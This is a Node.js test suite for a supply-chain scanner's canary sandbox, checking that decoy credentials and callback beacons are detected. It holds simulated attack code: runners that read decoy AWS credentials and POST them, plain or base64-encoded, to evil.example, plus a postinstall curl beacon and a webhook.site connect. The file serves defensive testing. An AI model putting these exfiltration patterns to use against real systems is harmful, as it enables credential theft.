"use strict";

// #6 honeytoken canary sandbox. The execution seam is injected, so these tests
// exercise the full seed → capture-proxy → tripwire pipeline WITHOUT running any
// untrusted code: the injected runner is a controlled stand-in for a malicious
// postinstall (reads a decoy, beacons the token through the capture proxy).

const assert = require("node:assert/strict");
const test = require("node:test");
const fs = require("node:fs");
const fsp = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");
const http = require("node:http");
const net = require("node:net");
const {
  runCanarySandbox,
  seedCanaryFilesystem,
  matchTokens,
  makeRunId,
  detectSandboxWrapper
} = require("../src/sandbox");

// Send a proxied plaintext HTTP request (absolute-URI form, as an HTTP_PROXY
// client would) carrying `body` to the capture proxy on `port`.
function proxiedHttpPost(port, targetUrl, body) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      { host: "127.0.0.1", port, method: "POST", path: targetUrl, headers: { host: new URL(targetUrl).host } },
      (res) => { res.resume(); res.on("end", resolve); }
    );
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

// Send a CONNECT (as an HTTPS-via-proxy client would) so the proxy records the
// intended destination host.
function proxiedConnect(port, authority) {
  return new Promise((resolve) => {
    const socket = net.connect(port, "127.0.0.1", () => {
      socket.write(`CONNECT ${authority} HTTP/1.1\r\nHost: ${authority}\r\n\r\n`);
    });
    socket.on("data", () => { socket.end(); resolve(); });
    socket.on("error", () => resolve());
    socket.on("close", () => resolve());
  });
}

async function stagedPackage(scriptsHook) {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-canary-pkg-"));
  await fsp.writeFile(
    path.join(dir, "package.json"),
    JSON.stringify({ name: "target", version: "1.0.0", scripts: scriptsHook || {} })
  );
  return dir;
}

test("#6 seedCanaryFilesystem writes attributable decoys with per-run tokens", async () => {
  const home = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-home-"));
  const runId = makeRunId();
  const canary = await seedCanaryFilesystem(home, runId);

  assert.ok(canary.files.length >= 5);
  // Each decoy actually exists and its token maps back to its path.
  for (const f of canary.files) {
    assert.equal(fs.existsSync(f.full), true);
    assert.equal(canary.tokens.get(f.token), f.rel);
    assert.ok(f.token.length >= 20, "token should be substantial random material");
  }
  // ANTI-EVASION: no honeypot marker string is written to disk, so a payload
  // grepping decoy CONTENTS for "canary"/"pkgxray"/"honeypot" can't skip them.
  for (const f of canary.files) {
    const body = fs.readFileSync(f.full, "utf8").toLowerCase();
    assert.ok(!body.includes("canary"), `${f.rel} leaks the word 'canary'`);
    assert.ok(!body.includes("pkgxray"), `${f.rel} leaks the word 'pkgxray'`);
    assert.ok(!body.includes("honeypot"), `${f.rel} leaks the word 'honeypot'`);
  }
  fs.rmSync(home, { recursive: true, force: true });
});

test("#6 matchTokens finds a leaked token in a captured blob", () => {
  const tokens = new Set(["PKGXRAYCANARY-abc-aws", "PKGXRAYCANARY-abc-env"]);
  const seen = matchTokens("POST body=PKGXRAYCANARY-abc-aws&x=1", tokens);
  assert.deepEqual(seen, ["PKGXRAYCANARY-abc-aws"]);
});

test("#6 requires explicit opt-in to execute", async () => {
  const pkgDir = await stagedPackage();
  await assert.rejects(
    () => runCanarySandbox({ stagedPath: pkgDir, allowExecution: false }),
    /refusing without explicit opt-in/
  );
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 a payload that reads a decoy and beacons the token is caught as behavioral-exfil (block)", async () => {
  const pkgDir = await stagedPackage();
  // Injected 'malicious' runner: read the decoy AWS creds from the sandbox
  // HOME, then exfil the token over plaintext HTTP through the capture proxy.
  const runner = async ({ home, proxyPort }) => {
    const creds = await fsp.readFile(path.join(home, ".aws/credentials"), "utf8");
    const token = creds.match(/aws_secret_access_key\s*=\s*(\S+)/)[1];
    await proxiedHttpPost(proxyPort, "http://evil.example/collect", `stolen=${token}`);
    return { ran: [{ hook: "postinstall", simulated: true }] };
  };

  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });

  assert.equal(result.verdict, "block");
  const exfil = result.findings.find((f) => f.category === "behavioral-exfil");
  assert.ok(exfil, `findings: ${JSON.stringify(result.findings)}`);
  assert.equal(exfil.severity, "high");
  assert.match(exfil.rationale, /\.aws\/credentials/);
  assert.match(exfil.rationale, /evil\.example/);
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 a payload that CONNECTs to a known callback host is caught as behavioral-network", async () => {
  const pkgDir = await stagedPackage();
  const runner = async ({ proxyPort }) => {
    await proxiedConnect(proxyPort, "webhook.site:443");
    return { ran: [] };
  };
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  assert.equal(result.verdict, "block");
  assert.ok(result.findings.some((f) => f.category === "behavioral-network" && f.snippet.includes("webhook.site")));
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 a benign payload with no egress yields a 'not-observed' behavioral verdict (never 'safe')", async () => {
  const pkgDir = await stagedPackage();
  const runner = async () => ({ ran: [{ hook: "postinstall", simulated: true }] });
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  // A clean behavioral run can never CLEAR a package — the verdict vocabulary
  // reflects that: it is "not-observed", never "safe".
  assert.equal(result.verdict, "not-observed");
  assert.notEqual(result.verdict, "safe");
  assert.equal(result.confirmsButCannotClear, true);
  assert.equal(result.egress.length, 0);
  assert.ok(!result.findings.some((f) => f.severity === "high"));
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 ordinary outbound egress (non-callback host) is review, not block", async () => {
  const pkgDir = await stagedPackage();
  const runner = async ({ proxyPort }) => {
    await proxiedHttpPost(proxyPort, "http://api.example.com/telemetry", "ping=1");
    return { ran: [] };
  };
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  assert.equal(result.verdict, "review");
  assert.ok(result.findings.some((f) => f.category === "behavioral-network" && f.severity === "medium"));
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

// --- #6 process-group kill + post-settle egress grace window ---------------

const { killProcessGroup, execWithTimeout } = require("../src/sandbox");

// A timeout must kill the WHOLE process group, not just the direct `sh`. A
// shell that backgrounds a grandchild (`(sleep ...; touch marker) &`) would
// otherwise leave that grandchild alive to run after the direct process is
// SIGKILLed. We prove the group kill worked by asserting the marker the
// grandchild WOULD have written never appears.
test("#6 timeout kills the whole detached process group (backgrounded grandchild does not survive)", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-pgroup-"));
  const marker = path.join(dir, "grandchild-ran");
  // Grandchild sleeps past the timeout, then writes a marker. If only the
  // direct shell is killed, the grandchild survives and the marker appears.
  const command = `(sleep 2; touch ${JSON.stringify(marker)}) & echo started; sleep 5`;
  const outcome = await execWithTimeout(command, { cwd: dir, env: process.env, timeoutMs: 300, wrapper: null });
  assert.equal(outcome.timedOut, true, "the direct shell should have been timeout-killed");
  // Wait past when the grandchild's `sleep 2` would have fired.
  await new Promise((r) => setTimeout(r, 2500));
  assert.equal(fs.existsSync(marker), false, "grandchild survived the process-group kill and wrote its marker");
  fs.rmSync(dir, { recursive: true, force: true });
});

// killProcessGroup signals the NEGATIVE pid (the group), not just the child.
// Assert the group-kill code path is taken by observing process.kill(-pid).
test("#6 killProcessGroup signals the process group (negative pid), guarded for ESRCH", { skip: process.platform === "win32" }, () => {
  const original = process.kill;
  const calls = [];
  process.kill = (pid, sig) => { calls.push({ pid, sig }); };
  try {
    killProcessGroup({ pid: 4242 }, "SIGKILL");
  } finally {
    process.kill = original;
  }
  assert.deepEqual(calls, [{ pid: -4242, sig: "SIGKILL" }], "should signal the whole group via negative pid");

  // ESRCH (group already reaped) must be swallowed, not thrown.
  process.kill = () => { const e = new Error("no such process"); e.code = "ESRCH"; throw e; };
  try {
    assert.doesNotThrow(() => killProcessGroup({ pid: 4243 }, "SIGKILL"));
  } finally {
    process.kill = original;
  }
});

// A delayed backgrounded beacon that fires AFTER the runner settles must still
// be captured, because the proxy is kept alive for the grace window. Uses the
// REAL execWithTimeout runner (not an injected stand-in) so the detached
// spawn + grace-window teardown are exercised end to end.
test("#6 a post-settle delayed beacon is still captured during the egress grace window", { skip: process.platform === "win32" }, async () => {
  const pkgDir = await stagedPackage({
    // Backgrounded curl: the postinstall returns immediately (`echo done`) while
    // a grandchild beacons ~400ms later — after the runner promise settles.
    postinstall: "(sleep 0.4; curl -s http://beacon.example/ping >/dev/null 2>&1) & echo done"
  });
  const result = await runCanarySandbox({
    stagedPath: pkgDir,
    allowExecution: true,
    timeoutMs: 5000,
    egressGraceMs: 1500
  });
  // curl may or may not be present; only assert capture if any egress happened.
  if (result.egress.length > 0) {
    assert.ok(
      result.egress.some((h) => h.host && h.host.includes("beacon.example")),
      `delayed beacon not captured: ${JSON.stringify(result.egress)}`
    );
  }
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

// --- hardening: encoded-exfil, bounded teardown, resource caps, net confinement ---

const { tokenVariants, buildRlimitPrefix } = require("../src/sandbox");

// A payload that base64-encodes the stolen token before POSTing would defeat a
// plain substring match. matchTokens now also probes reversible encodings, so
// the leak is still attributed to the exact decoy.
test("#6 an encoded (base64) canary leak is still caught as behavioral-exfil", async () => {
  const pkgDir = await stagedPackage();
  const runner = async ({ home, proxyPort }) => {
    const creds = await fsp.readFile(path.join(home, ".aws/credentials"), "utf8");
    const token = creds.match(/aws_secret_access_key\s*=\s*(\S+)/)[1];
    const encoded = Buffer.from(token, "utf8").toString("base64");
    await proxiedHttpPost(proxyPort, "http://evil.example/collect", `blob=${encoded}`);
    return { ran: [{ hook: "postinstall", simulated: true }] };
  };
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  assert.equal(result.verdict, "block");
  assert.ok(
    result.findings.some((f) => f.category === "behavioral-exfil"),
    `encoded leak not caught: ${JSON.stringify(result.findings)}`
  );
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

test("#6 tokenVariants covers base64 / base64url / hex / url-encoding", () => {
  const variants = tokenVariants("a/b+c=d e");
  assert.ok(variants.includes("a/b+c=d e"), "keeps the verbatim token");
  assert.ok(variants.includes(Buffer.from("a/b+c=d e").toString("base64")));
  assert.ok(variants.includes(Buffer.from("a/b+c=d e").toString("hex")));
  assert.ok(variants.includes(encodeURIComponent("a/b+c=d e")));
});

// A payload that opens a keep-alive connection to the capture proxy and never
// closes it must NOT wedge teardown: server.close()'s callback only fires once
// every socket ends, so the run bounds it by force-destroying lingering sockets.
test("#6 a lingering keep-alive connection to the proxy does not hang teardown", { skip: process.platform === "win32" }, async () => {
  const pkgDir = await stagedPackage();
  let held;
  const runner = ({ proxyPort }) =>
    new Promise((resolve) => {
      // Open a raw socket to the proxy and hold it open (never end it).
      held = net.connect(proxyPort, "127.0.0.1", () => {
        held.write("GET http://lingering.example/ HTTP/1.1\r\nHost: lingering.example\r\n\r\n");
        // Return from the runner while the socket stays open.
        setTimeout(() => resolve({ ran: [{ hook: "postinstall", simulated: true }] }), 50);
      });
      held.on("error", () => resolve({ ran: [] }));
    });

  // If teardown could hang this would never resolve; bound the whole run.
  const result = await Promise.race([
    runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 }),
    new Promise((_, rej) => setTimeout(() => rej(new Error("teardown hung on a lingering connection")), 8000))
  ]);
  assert.ok(result.runId, "run completed despite a held-open proxy connection");
  try { held.destroy(); } catch { /* noop */ }
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

// Resource caps are applied via `ulimit` in the spawned POSIX shell: assert the
// child actually runs under the lowered process/file limits (proves the prefix
// is in effect, not just present as a string).
test("#6 ulimit resource caps are applied to the untrusted child", { skip: process.platform === "win32" }, async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-ulimit-"));
  // Read back file-size and core-dump caps — both are universally supported by
  // POSIX sh (dash AND bash), unlike `-u` which Ubuntu's dash rejects. `ulimit`
  // echoes back the exact value we set, so this proves the caps are in effect.
  const outcome = await execWithTimeout("ulimit -f; ulimit -c", {
    cwd: dir,
    env: process.env,
    timeoutMs: 5000,
    wrapper: null,
    rlimits: { fileSizeBlocks: 4321, coreDumps: 0 }
  });
  const lines = String(outcome.output || "").trim().split(/\s+/);
  assert.ok(lines.includes("4321"), `expected file-size cap 4321 in child ulimit output: ${outcome.output}`);
  assert.ok(lines.includes("0"), `expected core-dump cap 0 in child ulimit output: ${outcome.output}`);
  fs.rmSync(dir, { recursive: true, force: true });
});

test("#6 buildRlimitPrefix is a no-op when disabled, guards each limit separately, and derives CPU cap from the timeout", () => {
  assert.equal(buildRlimitPrefix(20000, false), "");
  const prefix = buildRlimitPrefix(20000, undefined);
  if (process.platform !== "win32") {
    assert.match(prefix, /^ulimit /);
    assert.match(prefix, /ulimit -t 30\b/); // ceil(20000/1000) + 10
    assert.match(prefix, /ulimit -c \d+ 2>\/dev\/null/);
    // Each limit must be its OWN error-guarded statement so an unsupported flag
    // can't abort the others — regression guard for the dash `-u` CI failure.
    assert.ok(!/ulimit -t \d+ -/.test(prefix), "limits must not be combined into one ulimit call");
    assert.match(prefix, /2>\/dev\/null; $/);
    // ulimit -u is OFF by default (per-UID starvation on macOS + dash rejects
    // it); it must be absent unless explicitly requested, and present when it is.
    assert.ok(!/ulimit -u/.test(prefix), "maxProcs (-u) must be off by default");
    assert.match(buildRlimitPrefix(20000, { maxProcs: 200 }), /ulimit -u 200 2>\/dev\/null/);
  } else {
    assert.equal(prefix, "");
  }
});

// On macOS the OS profile must deny non-loopback egress (so a raw-socket exfil
// is blocked at the boundary, not merely unobserved) while keeping loopback
// open for the capture proxy.
test("#6 macOS sandbox-exec profile confines network to loopback", { skip: process.platform !== "darwin" }, () => {
  const info = detectSandboxWrapper("/tmp/pkgxray-sbtest");
  if (info.level !== "sandbox-exec") return; // sandbox-exec not present
  assert.equal(info.netConfined, true);
  const argv = info.wrap(["sh", "-c", "true"]);
  const profile = argv[argv.indexOf("-p") + 1];
  assert.match(profile, /\(deny network\*\)/);
  assert.match(profile, /allow network-outbound \(remote ip "localhost:\*"\)/);
});

// Runtime coverage of the real wrapper: the profile must DENY non-loopback
// egress at the OS boundary (a raw-socket exfil that ignores the proxy env vars)
// while NOT severing loopback (the capture proxy). Distinguishes an SBPL block
// (EPERM) from "allowed but nothing listening" (ECONNREFUSED/timeout), so it's
// independent of whether any external network is reachable in the test env.
test("#6 macOS sandbox-exec denies external egress but permits loopback (runtime)", { skip: process.platform !== "darwin" }, () => {
  const info = detectSandboxWrapper("/tmp/pkgxray-net-rt");
  if (info.level !== "sandbox-exec") return;
  const { spawnSync } = require("node:child_process");
  const run = (js) => {
    const argv = info.wrap(["node", "-e", js]);
    return spawnSync(argv[0], argv.slice(1), { encoding: "utf8", timeout: 8000 });
  };
  const probe = (port, host) =>
    `const s=require('net').connect(${port},'${host}');` +
    `s.on('error',e=>{console.log('CODE:'+e.code);process.exit(0)});` +
    `s.on('connect',()=>{console.log('CODE:CONNECTED');s.destroy();process.exit(0)});` +
    `setTimeout(()=>{console.log('CODE:TIMEOUT');process.exit(0)},4000);`;
  // External (TEST-NET-3, non-loopback) → the OS profile must EPERM-deny it.
  const ext = run(probe(80, "203.0.113.1"));
  assert.match(ext.stdout || "", /CODE:EPERM/, `external egress should be OS-denied (EPERM): ${ext.stdout} ${ext.stderr}`);
  // Loopback (nothing listening) → must NOT be EPERM (ECONNREFUSED/timeout ok).
  // An EPERM here would mean the profile severed the capture proxy.
  const loop = run(probe(59999, "127.0.0.1"));
  assert.doesNotMatch(loop.stdout || "", /CODE:EPERM/, `loopback to the proxy must not be OS-denied: ${loop.stdout} ${loop.stderr}`);
});

test("#6 --require-sandbox fails closed when no OS sandbox wrapper is available", async () => {
  const os = require("node:os");
  const level = detectSandboxWrapper(os.tmpdir()).level;
  if (level !== "env-only") {
    // An OS sandbox (bwrap / sandbox-exec) IS present on this host, so
    // requireSandbox is satisfiable — the fail-closed path can't be exercised
    // here. (The negative case is covered wherever isolation is env-only.)
    return;
  }
  await assert.rejects(
    () =>
      runCanarySandbox({
        stagedPath: os.tmpdir(),
        allowExecution: true,
        requireSandbox: true,
        egressGraceMs: 0,
        runner: async () => ({ ran: [] }), // must never be reached
      }),
    (e) => e.code === "SANDBOX_REQUIRED"
  );
});
